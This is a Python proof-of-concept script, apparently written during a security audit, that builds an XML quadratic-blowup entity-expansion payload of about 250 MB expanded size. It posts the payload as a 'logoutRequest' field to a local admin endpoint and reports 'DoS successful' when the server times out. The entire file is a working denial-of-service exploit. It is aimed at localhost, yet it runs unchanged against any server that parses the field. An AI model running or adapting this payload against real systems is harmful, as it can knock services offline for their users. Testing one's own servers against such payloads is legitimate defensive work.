import requests
import time
import sys

# Configuration
TARGET_URL = "http://127.0.0.1:8000/admin/"
ENTITY_SIZE = 50000  # 50KB per entity
ENTITY_COUNT = 5000  # Repeat 5000 times -> ~250MB expansion (Safe for demo, but heavy)

def run_attack():
    print("[-] Generating Quadratic Blowup Payload...")
    
    # 1. Define a large entity (50KB of 'A's)
    large_entity_def = "A" * ENTITY_SIZE
    
    # 2. Reference it many times
    references = "&large;" * ENTITY_COUNT
    
    # 3. Construct XML
    payload = f"""<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY large "{large_entity_def}">
]>
<root>{references}</root>"""

    print(f"[-] Payload Size (Compressed/Sent): {len(payload) / 1024 / 1024:.2f} MB")
    print(f"[-] Target Expansion Size: {(ENTITY_SIZE * ENTITY_COUNT) / 1024 / 1024:.2f} MB")
    
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Trae-Security-Audit"
    }
    
    data = {
        "logoutRequest": payload
    }
    
    print(f"[-] Sending request to {TARGET_URL}...")
    start_time = time.time()
    try:
        response = requests.post(TARGET_URL, data=data, headers=headers, timeout=30)
        duration = time.time() - start_time
        print(f"[+] Request completed in {duration:.2f} seconds.")
        print(f"[+] Status Code: {response.status_code}")
        print(f"[+] Response: {response.text[:500]}") # Show first 500 chars of error
        if duration > 1.0:
            print(f"[!] VULNERABILITY CONFIRMED: High latency detected ({duration:.2f}s). The server spent significant time processing the expanded XML.")
        else:
            print(f"[?] Low latency. Server might have rejected it or machine is very fast.")
            
    except requests.exceptions.Timeout:
        print(f"[!] TIMEOUT: Server failed to respond within 30 seconds. DoS successful.")
    except Exception as e:
        print(f"[!] Error: {e}")

    # Save Payload for User Inspection
    with open("quadratic_payload_sample.txt", "w") as f:
        # Truncate the huge entity for readability in the file
        display_payload = payload.replace(large_entity_def, "A" * 100 + "...(50000 chars total)...")
        f.write(display_payload)
    print("[-] Sample payload saved to 'quadratic_payload_sample.txt'")

if __name__ == "__main__":
    run_attack()
